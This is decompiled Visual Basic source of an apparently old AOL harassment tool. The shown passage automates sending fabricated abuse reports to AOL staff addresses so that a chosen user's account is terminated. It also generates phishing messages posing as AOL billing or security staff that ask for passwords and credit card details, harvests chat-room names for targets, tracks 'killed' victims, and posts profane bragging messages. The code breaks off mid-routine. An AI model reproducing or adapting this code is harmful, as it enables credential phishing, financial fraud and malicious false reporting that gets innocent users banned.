' FORM1.FRM
Option Explicit
Const c0074 = 513 ' &H201%
Const c007C = 514 ' &H202%
Const c01BE = 1 ' &H1%
Const c0218 = 258 ' &H102%
Const c022E = 16 ' &H10%
Const c023A = 1 ' &H1%
Const c07E6 = 12 ' &HC%
Const c0810 = 2 ' &H2%

Sub aamm_Click ()
Dim l0020 As Variant
Dim l0024 As Variant
Dim l0028 As Variant
Dim l0030 As String
Dim l0032 As Variant
Dim l0042() As Integer
Dim l004A As Integer
Dim l004E As Variant
Dim l0054 As Variant
Dim l0058 As String
Dim l0060 As Variant
Dim l0066 As Variant
Dim l006C As Variant
Dim l0070 As Variant
' Const c0074 = 513 ' &H201%
Dim l0078 As Variant
' Const c007C = 514 ' &H202%
Dim l007E As Variant
Dim l0082 As Variant
Dim l008C As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0020 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0024 = 6
    l0028 = Int(Rnd * l0024 + 1)
      If  l0028 = 1 Then l0030$ = "" & Form1.Room & " asked for my password."
      If  l0028 = 2 Then l0030$ = "" & Form1.Room & " tried to hack my password."
      If  l0028 = 3 Then l0030$ = "Read!" & Form1.Room & " asked for my password."
      If  l0028 = 4 Then l0030$ = "Please do something about " & Form1.Room & "."
      If  l0028 = 5 Then l0030$ = "This guy wants my password:" & Form1.Room
      If  l0028 = 6 Then l0030$ = "Please help " & Form1.Room & " wants my password."
      If  l0028 = 7 Then l0030$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0032) Like "*KaOS*" Or UCase$(l0032) Like "*NiPP*" Or UCase$(l0032) Like "*CHOP*" Or UCase$(l0032) Like "*LoRe*" Or UCase$(l0032) Like "*CouNT*" Or UCase$(l0032) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN AM"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l004A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l004E = extfn24E0(l004A%, "Compose Mail")
DoEvents
Loop Until l004E <> 0
l0054 = fn5D0(l0042(), l004E, "*", "_AOL_Edit", Null)
subF00 l0042(1), "Lotsen AM"
subF00 l0042(3), "" & l0030$
l0058$ = Chr(10)
subF00 l0042(4), "" & Room & ":" & " " & "" & Text1 & l0058$ & l0058$
l0060 = extfn24E0(l004E, "Send")
l0066 = extfn2518(l004E, "_AOL_Icon")
l006C = extfn13D0(l0066, 2)
l0070 = extfn13D0(l006C, 2)
l0078 = extfn1750(l0066, c0074, 0, 0&)
l007E = extfn1750(l0066, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0082 = 0 To Combo1.ListCount
l008C$ = Combo1.List(l0082)
If  Room = l008C$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub aawww_Click ()
Dim l008E As Variant
Dim l0092 As Variant
Dim l0096 As Variant
Dim l009A As String
Dim l009C As Variant
Dim l00A0() As Integer
Dim l00A6 As Integer
Dim l00A8 As Variant
Dim l00AC As Variant
Dim l00B0 As String
Dim l00B2 As Variant
Dim l00B6 As Variant
Dim l00BA As Variant
Dim l00BE As Variant
Dim l00C2 As Variant
Dim l00C6 As Variant
Dim l00CA As Variant
Dim l00CE As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l008E = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0092 = 6
    l0096 = Int(Rnd * l0092 + 1)
      If  l0096 = 1 Then l009A$ = "" & Form1.Room & " asked for my password."
      If  l0096 = 2 Then l009A$ = "" & Form1.Room & " tried to hack my password."
      If  l0096 = 3 Then l009A$ = "Read!" & Form1.Room & " asked for my password."
      If  l0096 = 4 Then l009A$ = "Please do something about " & Form1.Room & "."
      If  l0096 = 5 Then l009A$ = "This guy wants my password:" & Form1.Room
      If  l0096 = 6 Then l009A$ = "Please help " & Form1.Room & " wants my password."
      If  l0096 = 7 Then l009A$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l009C) Like "*KaOS*" Or UCase$(l009C) Like "*NiPP*" Or UCase$(l009C) Like "*CHOP*" Or UCase$(l009C) Like "*LoRe*" Or UCase$(l009C) Like "*CouNT*" Or UCase$(l009C) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • LOTSEN AW"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l00A6% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l00A8 = extfn24E0(l00A6%, "Compose Mail")
DoEvents
Loop Until l00A8 <> 0
l00AC = fn5D0(l00A0(), l00A8, "*", "_AOL_Edit", Null)
subF00 l00A0(1), "Lotsen AW"
subF00 l00A0(3), "" & l009A$
l00B0$ = Chr(10)
subF00 l00A0(4), "" & Room & ":" & " " & "" & Text1 & l00B0$ & l00B0$
l00B2 = extfn24E0(l00A8, "Send")
l00B6 = extfn2518(l00A8, "_AOL_Icon")
l00BA = extfn13D0(l00B6, 2)
l00BE = extfn13D0(l00BA, 2)
l00C2 = extfn1750(l00B6, c0074, 0, 0&)
l00C6 = extfn1750(l00B6, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l00CA = 0 To Combo1.ListCount
l00CE$ = Combo1.List(l00CA)
If  Room = l00CE$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub adv_Click ()
Dim l00D0 As Variant
Dim l00D4 As Variant
Dim l00D8 As Variant
Dim l00DC As String
Dim l00DE As Variant
Dim l00E2() As Integer
Dim l00E8 As Integer
Dim l00EA As Variant
Dim l00EE As Variant
Dim l00F2 As String
Dim l00F4 As Variant
Dim l00F8 As Variant
Dim l00FC As Variant
Dim l0100 As Variant
Dim l0104 As Variant
Dim l0108 As Variant
Dim l010C As Variant
Dim l0110 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l00D0 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l00D4 = 6
    l00D8 = Int(Rnd * l00D4 + 1)
      If  l00D8 = 1 Then l00DC$ = "" & Form1.Room & " asked for my password."
      If  l00D8 = 2 Then l00DC$ = "" & Form1.Room & " tried to hack my password."
      If  l00D8 = 3 Then l00DC$ = "Read!" & Form1.Room & " asked for my password."
      If  l00D8 = 4 Then l00DC$ = "Please do something about " & Form1.Room & "."
      If  l00D8 = 5 Then l00DC$ = "This guy wants my password:" & Form1.Room
      If  l00D8 = 6 Then l00DC$ = "Please help " & Form1.Room & " wants my password."
      If  l00D8 = 7 Then l00DC$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l00DE) Like "*KaOS*" Or UCase$(l00DE) Like "*NiPP*" Or UCase$(l00DE) Like "*CHOP*" Or UCase$(l00DE) Like "*LoRe*" Or UCase$(l00DE) Like "*CouNT*" Or UCase$(l00DE) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSAdvisor"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l00E8% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l00EA = extfn24E0(l00E8%, "Compose Mail")
DoEvents
Loop Until l00EA <> 0
l00EE = fn5D0(l00E2(), l00EA, "*", "_AOL_Edit", Null)
subF00 l00E2(1), "TOSAdvisor"
subF00 l00E2(3), "" & l00DC$
l00F2$ = Chr(10) + Chr(3)
subF00 l00E2(4), "" & Room & ":" & " " & "" & Text1 & l00F2$ & l00F2$
l00F4 = extfn24E0(l00EA, "Send")
l00F8 = extfn2518(l00EA, "_AOL_Icon")
l00FC = extfn13D0(l00F8, 2)
l0100 = extfn13D0(l00FC, 2)
l0104 = extfn1750(l00F8, c0074, 0, 0&)
l0108 = extfn1750(l00F8, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l010C = 0 To Combo1.ListCount
l0110$ = Combo1.List(l010C)
If  Room = l0110$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub advf_Click ()
sub30B0 "|\¯¯¯¯\   /¯¯¯¯/|/¯¯¯¯/|   |\¯¯¯¯\_______               |\¯¯¯¯\"
subF38 .7#
sub30B0 "|;|       |_'|       |/____/|¯¯¯¯|\____\¯/       /|      /¯¯¯¯/|       |"
subF38 .7#
sub30B0 " \|       |;:|       |/¯¯¯¯/|       |;|=-    /       /;:|     |       |/____/|"
subF38 .7#
sub30B0 " /___¸'/|;:|\____\____\|____|\|=-  /____/_\¯¯¯¯\____\/¯¯¯¯/|"
subF38 .7#
sub30B0 "|=-    |;|¯'|;|=-    |=-            |  ¯¯¯|=-        |\____\=- /____/;:|"
subF38 .7#
sub30B0 "|=-    |/    \|=-    |=-            |       |=-        |;|=-    |=-|=-    |;:/"
subF38 .7#
sub30B0 " ¯¯¯¯        ¯¯¯¯ ¯¯¯¯¯¯¯¯         ¯¯¯¯¯¯ \|=-    |¯ |=-    |/"
subF38 .7#
sub30B0 "•-^v•HaZe-X²·³ • By: KaOS                       ¯¯¯¯    ¯¯¯¯"
End Sub

Sub boards_Click ()
Dim l0112 As Variant
Dim l0116 As Variant
Dim l011A As Variant
Dim l011E As String
Dim l0120 As Variant
Dim l0124() As Integer
Dim l012A As Integer
Dim l012C As Variant
Dim l0130 As Variant
Dim l0134 As String
Dim l0136 As Variant
Dim l013A As Variant
Dim l013E As Variant
Dim l0142 As Variant
Dim l0146 As Variant
Dim l014A As Variant
Dim l014E As Variant
Dim l0152 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0112 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0116 = 6
    l011A = Int(Rnd * l0116 + 1)
      If  l011A = 1 Then l011E$ = "" & Form1.Room & " asked for my password."
      If  l011A = 2 Then l011E$ = "" & Form1.Room & " tried to hack my password."
      If  l011A = 3 Then l011E$ = "Read!" & Form1.Room & " asked for my password."
      If  l011A = 4 Then l011E$ = "Please do something about " & Form1.Room & "."
      If  l011A = 5 Then l011E$ = "This guy wants my password:" & Form1.Room
      If  l011A = 6 Then l011E$ = "Please help " & Form1.Room & " wants my password."
      If  l011A = 7 Then l011E$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0120) Like "*KaOS*" Or UCase$(l0120) Like "*NiPP*" Or UCase$(l0120) Like "*CHOP*" Or UCase$(l0120) Like "*LoRe*" Or UCase$(l0120) Like "*CouNT*" Or UCase$(l0120) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSBoards1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l012A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l012C = extfn24E0(l012A%, "Compose Mail")
DoEvents
Loop Until l012C <> 0
l0130 = fn5D0(l0124(), l012C, "*", "_AOL_Edit", Null)
subF00 l0124(1), "TOSBoards1"
subF00 l0124(3), "" & l011E$
l0134$ = Chr(10) + Chr(3)
subF00 l0124(4), "" & Room & ":" & " " & "" & Text1 & l0134$ & l0134$
l0136 = extfn24E0(l012C, "Send")
l013A = extfn2518(l012C, "_AOL_Icon")
l013E = extfn13D0(l013A, 2)
l0142 = extfn13D0(l013E, 2)
l0146 = extfn1750(l013A, c0074, 0, 0&)
l014A = extfn1750(l013A, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l014E = 0 To Combo1.ListCount
l0152$ = Combo1.List(l014E)
If  Room = l0152$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub CGU_Click ()
Dim l0154 As Variant
Dim l0158 As Variant
Dim l015C As Variant
Dim l0160 As String
Dim l0162 As Variant
Dim l0166() As Integer
Dim l016C As Integer
Dim l016E As Variant
Dim l0172 As Variant
Dim l0176 As String
Dim l0178 As Variant
Dim l017C As Variant
Dim l0180 As Variant
Dim l0184 As Variant
Dim l0188 As Variant
Dim l018C As Variant
Dim l0190 As Variant
Dim l0194 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l0154 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l0158 = 6
    l015C = Int(Rnd * l0158 + 1)
      If  l015C = 1 Then l0160$ = "" & Form1.Room & " asked for my password."
      If  l015C = 2 Then l0160$ = "" & Form1.Room & " tried to hack my password."
      If  l015C = 3 Then l0160$ = "Read!" & Form1.Room & " asked for my password."
      If  l015C = 4 Then l0160$ = "Please do something about " & Form1.Room & "."
      If  l015C = 5 Then l0160$ = "This guy wants my password:" & Form1.Room
      If  l015C = 6 Then l0160$ = "Please help " & Form1.Room & " wants my password."
      If  l015C = 7 Then l0160$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l0162) Like "*KaOS*" Or UCase$(l0162) Like "*NiPP*" Or UCase$(l0162) Like "*CHOP*" Or UCase$(l0162) Like "*LoRe*" Or UCase$(l0162) Like "*CouNT*" Or UCase$(l0162) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • CGU France"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l016C% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l016E = extfn24E0(l016C%, "Compose Mail")
DoEvents
Loop Until l016E <> 0
l0172 = fn5D0(l0166(), l016E, "*", "_AOL_Edit", Null)
subF00 l0166(1), "CGU France"
subF00 l0166(3), "" & l0160$
l0176$ = Chr(10)
subF00 l0166(4), "" & Room & ":" & " " & "" & Text1 & l0176$ & l0176$
l0178 = extfn24E0(l016E, "Send")
l017C = extfn2518(l016E, "_AOL_Icon")
l0180 = extfn13D0(l017C, 2)
l0184 = extfn13D0(l0180, 2)
l0188 = extfn1750(l017C, c0074, 0, 0&)
l018C = extfn1750(l017C, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l0190 = 0 To Combo1.ListCount
l0194$ = Combo1.List(l0190)
If  Room = l0194$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub Command3D1_Click ()
Dim l0196 As Integer
Dim l0198 As String
Dim l019A As String
Dim l019C As Variant
Dim l01A0 As String
Dim l01A2 As Variant
Room.Clear
For l0196% = 0 To 25
l0198$ = String$(256, " ")
l01A2 = extfn2F98(l0196%, l0198$) & l019A$
If  Len(Trim$(l0198$)) <= 1 Then Exit For
l0198$ = Left$(Trim$(l0198$), Len(Trim(l0198$)) - 1)
For l019C = 0 To Room.ListCount - 1
l01A0$ = Room.List(l019C)
If l0198$ = l01A0$ GoTo L1441E
Next l019C
If  InStr(UCase$(l0198$), "MTV") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "TOS") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "GUIDE") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "AOL") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "TLA") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "ROR") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "CAT") <> 0 Then GoTo L1441E
If  InStr(UCase$(l0198$), "HOST") <> 0 Then GoTo L1441E
If l0198$ = fn7C8() GoTo L1441E
Room.AddItem l0198$
L1441E:
Next l0196%
Call sub34B0("Room List now RE-Freshed.")
End Sub

Sub Command3D10_Click ()
Dim l01B0 As Variant
Dim l01B4 As Variant
Dim l01B8 As Variant
Dim l01BC As String
' Const c01BE = 1 ' &H1%
If  Combo2.ListCount = 0 Then
MsgBox "There is no name to brag.", , "Error"
Exit Sub
End If
sub30B0 "•-^v•HaZe-X²·³ [gold] • By KaOS {S YEP}"
sub30B0 "•-^v•HaZe-X²·³ [gold] • " + Combo2 + ""
Randomize
For l01B0 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l01B4 = 6
    l01B8 = Int(Rnd * l01B4 + 1)
      If  l01B8 = 1 Then l01BC$ = "Poor dead fucker."
      If  l01B8 = 2 Then l01BC$ = "What a fuckin lamer."
      If  l01B8 = 3 Then l01BC$ = "Peace out Bitch."
      If  l01B8 = 4 Then l01BC$ = "Laytuh fuck stick."
      If  l01B8 = 5 Then l01BC$ = "LOL Poor BABY!?"
      If  l01B8 = 6 Then l01BC$ = "Hehehe um new Phish?"
      If  l01B8 = 7 Then l01BC$ = "Finally shut the fuck up."
      Next
sub30B0 "•-^v•HaZe-X²·³ [gold] • " & l01BC$
End Sub

Sub Command3D11_Click ()
Dim l01C6 As Variant
Dim l01CA As Variant
On Error GoTo L1489C
CMDialog1.DialogTitle = "Open a INACTIVE List..."
CMDialog1.Filter = "List Files (*.lst)| *.lst| All Files  (*.*)|*.*"
CMDialog1.Flags = &H1000&
CMDialog1.Action = c01BE
l01C6 = 1
If  (CMDialog1.Filetitle <> "") Then
Combo2.Clear
Open CMDialog1.Filetitle For Input As l01C6
While (EOF(l01C6) = False)
Line Input #l01C6, l01CA
Combo2.AddItem l01CA
Wend
Close l01C6
End If
L1489C:
Call sub34B0("Dead List Loaded.")
End Sub

Sub Command3D12_Click ()
Dim l01CE As Variant
Dim l01D2 As Variant
Dim l01D6 As Variant
Dim l01DA As String
If  Combo2.ListCount = 0 Then
MsgBox "Load a List.", , "Error"
Exit Sub
End If
sub30B0 "•-^v•HaZe-X²·³ [gold] • This many Bitch'z Dead"
sub30B0 "•-^v•HaZe-X²·³ [gold] • " + Combo2.ListCount
Randomize
For l01CE = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l01D2 = 6
    l01D6 = Int(Rnd * l01D2 + 1)
      If  l01D6 = 1 Then l01DA$ = "Daym im good."
      If  l01D6 = 2 Then l01DA$ = "Im da BOMB!"
      If  l01D6 = 3 Then l01DA$ = "Buncha dead bitch'z."
      If  l01D6 = 4 Then l01DA$ = "LOL hehe dead whore'z."
      If  l01D6 = 5 Then l01DA$ = "Why did they fuck wif me?"
      If  l01D6 = 6 Then l01DA$ = "Don't they learn?"
      If  l01D6 = 7 Then l01DA$ = "Shut em all up."
      Next
sub30B0 "•-^v•HaZe-X²·³ [gold] • " & l01DA$
End Sub

Sub Command3D13_Click ()
Dim l01DC As Variant
If  Combo2.ListCount = 0 Then Exit Sub
l01DC = Combo2.ListIndex
Combo2.RemoveItem (l01DC)
Call sub34B0("The name has been removed from the list.")
End Sub

Sub Command3D14_Click ()
Dim l01E0 As String
Dim l01E2 As Variant
Dim l01E6 As Variant
Dim l01EA As Variant
If  Combo2.ListCount = 0 Then
MsgBox "No dead people to brag.", , "Error"
Exit Sub
End If
Combo2.ListIndex = 0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Dead Bitch'z"
sub30B0 "•-^v•HaZe-X²·³ [gold] • " & Combo2.ListCount & " Bitch'z Killed."
sub30B0 "•-^v• " & Combo2 & " " & l01E0$
subF38 .8#
Do
Combo2.ListIndex = Combo2.ListIndex + 1
Randomize
For l01E2 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l01E6 = 6
    l01EA = Int(Rnd * l01E6 + 1)
      If  l01EA = 1 Then l01E0$ = "TOSed."
      If  l01EA = 2 Then l01E0$ = "Termed."
      If  l01EA = 3 Then l01E0$ = "Dead."
      If  l01EA = 4 Then l01E0$ = "Killed."
      If  l01EA = 5 Then l01E0$ = "Gone."
      If  l01EA = 6 Then l01E0$ = "R.I.P."
      If  l01EA = 7 Then l01E0$ = "Wasted."
      Next
      sub30B0 "•-^v• " & Combo2 & " " & l01E0$
      subF38 .8#
Loop Until Combo2.ListIndex = Combo2.ListCount - 1
Combo2.ListIndex = 0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Buncha Dead Bitch'z - NEXT!"
End Sub

Sub Command3D2_Click ()
Dim l01F0 As Variant
l01F0 = fn608(Text1)
Panel3D5.Caption = "Gen."
End Sub

Sub Command3D3_Click ()
Dim l01F4 As Variant
Dim l01F8 As Variant
Dim l01FC As Variant
Randomize
For l01F4 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l01F8 = 6
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = "Hello, "
      If  l01FC = 2 Then Text1 = "Good evening, "
      If  l01FC = 3 Then Text1 = "Hello, And welcome to America Online. "
      If  l01FC = 4 Then Text1 = "Welcome to America Online. "
      If  l01FC = 5 Then Text1 = "Excuse me, "
      If  l01FC = 6 Then Text1 = "Dear User, "
      If  l01FC = 7 Then Text1 = "Dear Member, "
    l01F8 = 7
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + "I am with America Online Billing "
      If  l01FC = 2 Then Text1 = Text1 + "I am with OTC (Online Techincal Consultants) "
      If  l01FC = 3 Then Text1 = Text1 + "I am with WWWC (World Wide Web Consultants) "
      If  l01FC = 4 Then Text1 = Text1 + "I am with AOL Techincal Staff "
      If  l01FC = 5 Then Text1 = Text1 + "I am with AOL System Security "
      If  l01FC = 6 Then Text1 = Text1 + "I am with AOL Resource Department. "
      If  l01FC = 7 Then Text1 = Text1 + "I am with AOL Porn Department. "
    l01F8 = 7
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + "and due to Technical Failures "
      If  l01FC = 2 Then Text1 = Text1 + "and due to Billing errors "
      If  l01FC = 3 Then Text1 = Text1 + "and due to Line Noise "
      If  l01FC = 4 Then Text1 = Text1 + "and due to A virus in our database "
      If  l01FC = 5 Then Text1 = Text1 + "and due to Massive data flow in our database "
      If  l01FC = 6 Then Text1 = Text1 + "and due to data corruption "
      If  l01FC = 7 Then Text1 = Text1 + "and due to many corrupt pictures"
    l01F8 = 5
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + "we seem to have lost your password. "
      If  l01FC = 2 Then Text1 = Text1 + "we seem to have lost your account information. "
      If  l01FC = 3 Then Text1 = Text1 + "we seem to have failed to recieve your logon password. "
      If  l01FC = 4 Then Text1 = Text1 + "we seem to have failed to recieve your account information."
      If  l01FC = 5 Then Text1 = Text1 + "we seem to have lost your account password"
    l01F8 = 5
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + "To correct this situation please click respond and enter "
      If  l01FC = 2 Then Text1 = Text1 + "Please click respond and enter your "
      If  l01FC = 3 Then Text1 = Text1 + "Please help us by entering your "
      If  l01FC = 4 Then Text1 = Text1 + "Please respond with your "
      If  l01FC = 5 Then Text1 = Text1 + "Please click respond with your"
    l01F8 = 4
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + "Your password information."
      If  l01FC = 2 Then Text1 = Text1 + "Your current account password."
      If  l01FC = 3 Then Text1 = Text1 + "Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number."
      If  l01FC = 4 Then Text1 = Text1 + "Your Log On Password."
    l01F8 = 5
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + " Please respond within 2 minutes too keep this account active."
      If  l01FC = 2 Then Text1 = Text1 + " It is very important that you respond immediately."
      If  l01FC = 3 Then Text1 = Text1 + " Please respond as soon as possible "
      If  l01FC = 4 Then Text1 = Text1 + " Incooperation may lead to termination of your account."
      If  l01FC = 5 Then Text1 = Text1 + " Respond Fast before your account is dead."
    l01F8 = 5
    l01FC = Int(Rnd * l01F8 + 1)
      If  l01FC = 1 Then Text1 = Text1 + " Thank you for using America Online."
      If  l01FC = 2 Then Text1 = Text1 + " Thank you for your time."
      If  l01FC = 3 Then Text1 = Text1 + " Thank you for your cooperation."
      If  l01FC = 4 Then Text1 = Text1 + " Thank you for your help and enjoy the service!"
      If  l01FC = 5 Then Text1 = Text1 + " Thanks for your concern"
Next
Panel3D5 = "Gen.2"
End Sub

Sub Command3D4_Click ()
Dim l0200 As Integer
Dim l0204 As Variant
If  Combo1.ListCount = 0 Then
MsgBox "No names in list to save.", , "Error"
Exit Sub
End If
On Error GoTo L15FA2
CMDialog1.DialogTitle = "Save a INACTIVE List... ."
CMDialog1.Filter = "List Files (*.lst)| *.lst| All Files  (*.*)|*.*"
CMDialog1.Flags = &H1000&
CMDialog1.Action = 2
If  (CMDialog1.Filetitle <> "") Then
l0200 = 2
Open CMDialog1.Filename For Output As l0200
l0204 = 0
Do While l0204 < Combo1.ListCount
Print #l0200, Combo1.List(l0204)
l0204 = l0204 + 1
Loop
Close l0200
End If
L15FA2:
Call sub34B0("TOSed List Saved.")
Exit Sub
End Sub

Sub Command3D5_Click ()
Dim l0208() As Integer
Dim l020E As Integer
Dim l0210 As Variant
Dim l0214 As Variant
' Const c0218 = 258 ' &H102%
Dim l021A As Variant
Dim l021E As Variant
Dim l0222 As Variant
Dim l0226 As Variant
Dim l022A As Variant
' Const c022E = 16 ' &H10%
Dim l0232 As Variant
Dim l0236 As Variant
' Const c023A = 1 ' &H1%
If  Combo1.ListCount = 0 Then
MsgBox "There are no names to check.", , "Error"
Exit Sub
End If
l020E% = extfn1520("AOL Frame25", 0&)
Call subD08("Locate a Member Online", "Mem&bers")
Do
DoEvents
l0210 = extfn24E0(l020E%, "Locate Member Online")
DoEvents
Loop Until l0210 <> 0
l0214 = fn5D0(l0208(), l0210, "*", "_AOL_Edit", Null)
subF00 l0208(1), "" + Combo1
l021A = extfn1750(l0208(1), c0218, 13, 0)
subF38 (1)
l021E = extfn1520(32770&, "America Online")
If  l021E <> 0 Then
l0222 = extfn24E0(l021E, "OK")
l0226 = extfn1750(l0222, c0074, 0, 0)
l0226 = extfn1750(l0222, c007C, 0, 0)
l0232 = extfn16E0(l022A, c022E, 0, 0)
l0236 = extfn16E0(l0210, c022E, 0, 0)
Call sub34B0(Combo1.Text & " is not signed on.")
Else
l020E% = extfn1520("AOL Frame25", 0&)
l022A = extfn24E0(l020E%, "Locate " & Combo1)
End If
If  l022A <> 0 Then
l0232 = extfn16E0(l022A, c022E, 0, 0)
l0236 = extfn16E0(l0210, c022E, 0, 0)
Call sub34B0(Combo1.Text & " is still signed on.")
End If
End Sub

Sub Command3D6_Click ()
Dim l023C As Variant
Dim l0240 As Variant
On Error GoTo L165BE
CMDialog1.DialogTitle = "Open a INACTIVE List..."
CMDialog1.Filter = "List Files (*.lst)| *.lst| All Files  (*.*)|*.*"
CMDialog1.Flags = &H1000&
CMDialog1.Action = c023A
l023C = 1
If  (CMDialog1.Filetitle <> "") Then
Combo1.Clear
Open CMDialog1.Filetitle For Input As l023C
While (EOF(l023C) = False)
Line Input #l023C, l0240
Combo1.AddItem l0240
Wend
Close l023C
End If
L165BE:
Call sub34B0("TOSed List Loaded.")
End Sub

Sub Command3D7_Click ()
Dim l0244() As Integer
Dim l024A As Integer
Dim l024C As Variant
Dim l0250 As Variant
Dim l0254 As Variant
Dim l0258 As Variant
Dim l025C As Variant
Dim l0260 As Variant
Dim l0264 As Variant
Dim l0268 As Variant
Dim l026C As Variant
Dim l0270 As Variant
Dim l0274 As Variant
Dim l0278 As Variant
Dim l027C As Variant
Dim l0280 As Integer
Dim l0282 As Variant
Dim l0286 As Variant
Dim l028A As Integer
If  Combo1.ListCount = 0 Then
MsgBox "There are no names to check.", , "Error"
Exit Sub
End If
l024A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l024C = extfn24E0(l024A%, "Compose Mail")
DoEvents
Loop Until l024C <> 0
l0250 = fn5D0(l0244(), l024C, "*", "_AOL_Edit", Null)
subF00 l0244(1), "" + Combo1
subF00 l0244(3), " "
subF00 l0244(4), " "
l0254 = extfn24E0(l024C, "Send")
 l0258 = extfn2518(l024C, "_AOL_Icon")
 l025C = extfn13D0(l0258, 2)
 l0260 = extfn13D0(l025C, 2)
l0264 = extfn1750(l0258, c0074, 0, 0&)
l0268 = extfn1750(l0258, c007C, 0, 0&)
Do
subF38 (.09#)
